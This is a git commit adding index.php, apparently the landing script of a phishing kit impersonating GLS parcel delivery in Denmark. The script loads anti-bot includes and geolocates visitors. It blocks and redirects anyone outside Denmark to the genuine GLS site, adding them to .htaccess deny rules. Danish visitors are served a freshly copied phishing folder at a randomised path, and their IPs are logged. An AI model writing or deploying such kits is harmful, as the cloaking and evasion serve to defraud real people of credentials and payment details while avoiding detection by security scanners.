9d835042622d3862dfb4651afdd1b327c2b5a30a
MRXVIRUS-TN <86704543+MRXVIRUS-TN@users.noreply.github.com>
2021-06-30 06:25:38 +0100

    Add files via upload

---
+++ index.php
@@ -0,0 +1,67 @@
+<?php
+include "boots/antibots1.php";
+include "boots/antibots2.php";
+include "boots/antibots3.php";
+include "boots/antibots4.php";
+include "boots/antibots5.php";
+require "DK/getdata.php";
+//whether ip is from share internet
+if (!empty($_SERVER['HTTP_CLIENT_IP']))   
+  {
+    $ip_address = $_SERVER['HTTP_CLIENT_IP'];
+  }
+//whether ip is from proxy
+elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))  
+  {
+    $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
+  }
+//whether ip is from remote address
+else
+  {
+    $ip_address = $_SERVER['REMOTE_ADDR'];
+  }
+    $details = json_decode(file_get_contents("http://ip-api.com/json/".$ip_address));
+    $cn = $details->country;
+    if(strcmp($cn, 'Denmark') != 0){
+        /// block ip from htaccess file
+        $file = fopen(".htaccess","a");
+        fwrite($file,"deny from ".$ip_address);
+        fclose($file);
+        header("Location: https://gls-group.eu/DK"); 
+    }
+    else{
+for ($DIR = '', $i = 0, $z = strlen($a = '123456789')-1; $i != 6; $x = rand(0,$z), $DIR .= $a{$x}, $i++);
+$src="./DK";
+$random = rand(0,100000).$_SERVER['REMOTE_ADDR'];
+$dst		= "customer_center/user-".$DIR;
+	
+function recurse_copy($src, $dst) {
+
+	$dir = opendir($src);
+	$result = ($dir === false ? false : true);
+
+	if ($result !== false) {
+		$result = @mkdir($dst);
+
+		if ($result === true) {
+			while(false !== ( $file = readdir($dir)) ) { 
+				if (( $file != '.' ) && ( $file != '..' ) && $result) { 
+					if ( is_dir($src . '/' . $file) ) { 
+						$result = recurse_copy($src . '/' . $file,$dst . '/' . $file); 
+					} else { 
+						$result = copy($src . '/' . $file,$dst . '/' . $file); 
+					} 
+				} 
+			} 
+			closedir($dir);
+		}
+	}
+
+	return $result;
+}
+
+recurse_copy( $src, $dst );
+header("location:".$dst."");
+include('unlock.php');
+file_put_contents("djvu.txt",$ip."\n", FILE_APPEND);    }
+?>
